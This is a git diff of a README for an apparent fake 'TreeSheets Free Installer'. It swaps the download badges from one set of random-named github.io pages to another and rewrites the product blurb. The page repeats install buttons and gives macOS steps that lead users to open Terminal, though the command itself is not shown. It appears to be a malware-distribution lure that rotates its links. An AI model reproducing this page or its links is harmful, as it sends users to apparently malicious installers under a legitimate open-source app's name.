@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-Note--Taking-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Hierarchical+Notebook-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 TreeSheets Free Installer** — TreeSheets is a free, open-source data organizer described as a 'spreadsheet reinvented as a tree. Works without internet access, no account required. Full offline installation.
+**💻 TreeSheets Free Installer** — TreeSheets is a free, open-source hierarchical notebook and mind map tool with a unique zoomable grid interface. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install TreeSheets](https://img.shields.io/badge/⬇_Install_TreeSheets-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install TreeSheets](https://img.shields.io/badge/⬇_Install_TreeSheets-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About TreeSheets
 
-TreeSheets is a free, open-source data organizer described as a 'spreadsheet reinvented as a tree.' Create nested cells that can contain text, images, and further sub-tables, building hierarchical structures for notes, plans, and outlines. TreeSheets combines the flexibility of an outliner with the visual structure of a spreadsheet, creating a unique tool for organizing complex information.
+TreeSheets is a free, open-source hierarchical notebook and mind map tool with a unique zoomable grid interface. Data is organized in nested cells that can expand into trees or grids, providing a flexible structure for notes, task lists, and outlines.
 
 ---
 
 ## ❌ Problem: TreeSheets is hard to access
 
-- **Unconventional Interface** — Unique UI paradigm requires significant adjustment
-- **Learning Investment** — Mastering TreeSheets' approach takes dedicated time
-- **Sharing** — Files require TreeSheets to open; not universally readable
-- **Visual Design** — Dated appearance compared to modern productivity applications
+- **Unusual Interface** — Zoomable grid paradigm takes significant time to get comfortable with
+- **Dated Visual Design** — Interface looks significantly older than modern note-taking apps
+- **Limited Formatting** — Minimal text styling options compared to rich text editors
+- **Small Community** — Limited documentation and user resources
 
 ---
 
@@ -61,9 +61,9 @@ TreeSheets is a free, open-source data organizer described as a 'spreadsheet rei
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ TreeSheets is a free, open-source data organizer described as a 'spreadsheet rei
 
 <div align="center">
 
-[![⬇ Install TreeSheets](https://img.shields.io/badge/⬇_Install_TreeSheets-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install TreeSheets](https://img.shields.io/badge/⬇_Install_TreeSheets-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ TreeSheets is a free, open-source data organizer described as a 'spreadsheet rei
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ TreeSheets is a free, open-source data organizer described as a 'spreadsheet rei
 
 ---
 
-**TreeSheets Free Installer** — TreeSheets is a free, open-source data organizer described as a 'spreadsheet reinvented as a tree. Install without internet connection today!
+**TreeSheets Free Installer** — TreeSheets is a free, open-source hierarchical notebook and mind map tool with a unique zoomable grid interface. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install TreeSheets](https://img.shields.io/badge/⬇_Install_TreeSheets-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install TreeSheets](https://img.shields.io/badge/⬇_Install_TreeSheets-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
